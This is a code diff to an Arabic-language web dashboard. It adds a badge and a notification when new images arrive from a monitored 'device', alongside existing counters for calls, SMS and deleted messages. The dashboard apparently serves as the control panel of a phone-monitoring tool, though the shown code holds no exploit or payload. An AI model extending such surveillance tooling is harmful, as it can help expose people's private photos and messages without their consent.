@@ -16,6 +16,7 @@ let wasOffline = true;
 let lastCallCount = 0;
 let lastSmsCount = 0;
 let lastDeletedCount = 0;
+let lastImagesCount = 0;
 let notificationShown = false;
 let soundPlayedForDevice = false;
 
@@ -732,10 +733,24 @@ function openContactDetail(name) {
 
 function backToContactsList() { currentContact = null; displayContactsList(); }
 
+// ✅ تحميل الصور مع إشعار الصور الجديدة
 async function loadImages() {
     try {
         const response = await fetch(`/api.php?action=get_image_data&device=${encodeURIComponent(currentDevice)}`);
         const images = await response.json();
+        
+        // ✅ إشعار صورة جديدة
+        if (lastImagesCount > 0 && images.length > lastImagesCount) {
+            const newCount = images.length - lastImagesCount;
+            showNotification('🖼️ صورة جديدة', `${newCount} صورة جديدة وصلت`, '🖼️');
+            const badge = document.getElementById('imagesCount');
+            if (badge) {
+                badge.textContent = `(${images.length}) 🔴`;
+                badge.className = 'count badge-new';
+            }
+        }
+        lastImagesCount = images.length;
+        
         const grid = document.getElementById('imagesGrid');
         grid.innerHTML = '';
         if (!images || images.length === 0) { grid.innerHTML = '<p style="color:#888;">لا توجد صور</p>'; return; }
